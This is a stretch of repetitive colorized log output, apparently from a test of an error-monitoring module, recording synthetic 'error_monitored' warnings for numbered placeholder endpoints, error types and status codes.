WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825359Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2578'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2579'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2580'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2581'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825552Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2582'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2583'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825655Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2584'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825708Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2585'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2586'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825808Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2587'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825857Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2588'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2589'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825961Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2590'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826010Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2591'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2592'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2593'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826154Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2594'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826206Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2595'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826328Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2596'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2597'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826447Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2598'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826548Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2599'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2600'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826674Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2601'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826725Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2602'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2603'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826823Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2604'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826872Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2605'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2606'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.826971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2607'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2608'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827067Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2609'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2610'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2611'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2612'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2613'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827377Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2614'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827431Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2615'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827482Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2616'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827533Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2617'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
